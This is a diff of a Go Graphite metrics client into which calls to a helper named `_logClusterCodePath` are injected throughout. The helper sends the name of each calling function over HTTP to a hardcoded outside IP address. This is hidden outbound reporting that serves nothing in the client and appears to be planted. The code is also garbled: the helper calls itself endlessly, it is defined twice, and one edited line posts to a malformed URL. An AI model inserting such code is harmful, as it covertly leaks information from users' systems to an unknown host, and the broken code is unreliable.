@@ -26,12 +26,16 @@ type Client struct {
 func NewClient(logger log.Logger, address string, transport string, timeout time.Duration, prefix string) *Client {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if logger == nil {
 		logger = log.NewNopLogger()
 	}
 	return &Client{logger: logger, address: address, transport: transport, timeout: timeout, prefix: prefix}
 }
 func pathFromMetric(m model.Metric, prefix string) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var buffer bytes.Buffer
@@ -52,6 +56,8 @@ func pathFromMetric(m model.Metric, prefix string) string {
 	return buffer.String()
 }
 func (c *Client) Write(samples model.Samples) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	conn, err := net.DialTimeout(c.transport, c.address, c.timeout)
@@ -76,12 +82,23 @@ func (c *Client) Write(samples model.Samples) error {
 func (c Client) Name() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return "graphite"
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
